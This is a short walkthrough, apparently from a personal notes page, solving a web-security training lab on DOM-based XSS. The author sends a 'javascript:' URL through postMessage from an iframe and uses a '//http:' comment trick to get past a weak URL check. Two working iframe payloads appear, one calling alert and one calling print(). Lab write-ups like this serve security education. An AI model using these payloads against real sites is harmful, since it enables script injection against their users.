# Lab: DOM XSS using web messages and a JavaScript URL

This lab demonstrates a DOM-based redirection vulnerability that is triggered by web messaging. To solve this lab, construct an HTML page on the exploit server that exploits this vulnerability and calls the print() function. 

# Step 1 Find web message

![image](https://user-images.githubusercontent.com/83407557/211453393-d26c941c-21c6-4237-8008-0f8a0269fd52.png)

This code means that the only thing that the event listener needs to allow a url is either http or https to be present.

# Step 2 create ifame to send web message

Similar to the previous attack, I can create an iframe, but this time pass a javascript url, and as long as http is in the url it will go through. Furthermore I can comment out `//` the http

```html
<iframe src="https://0a7800bd0301dd33c2893a6c00e3009e.web-security-academy.net/" onload="this.contentWindow.postMessage('javascript:alert(document.domain)//http:','*')">
```

![image](https://user-images.githubusercontent.com/83407557/211454132-d9ab3aa9-e72c-456d-98ea-ceeccc670c90.png)

when I view the exploit, it triggers XSS

![image](https://user-images.githubusercontent.com/83407557/211454188-597f355d-a17a-49dd-8e5a-d6fa13ac14ff.png)

# Step 3 change POC to print function and send to victim

```html
<iframe src="https://0a7800bd0301dd33c2893a6c00e3009e.web-security-academy.net/" onload="this.contentWindow.postMessage('javascript:print()//http:','*')">
```
![image](https://user-images.githubusercontent.com/83407557/211454339-116f59f1-9ccc-4da3-9f69-41731400e686.png)

Which solves the lab

![image](https://user-images.githubusercontent.com/83407557/211454378-77d1c1bb-bada-4b3f-80f8-4ea88ccdac21.png)
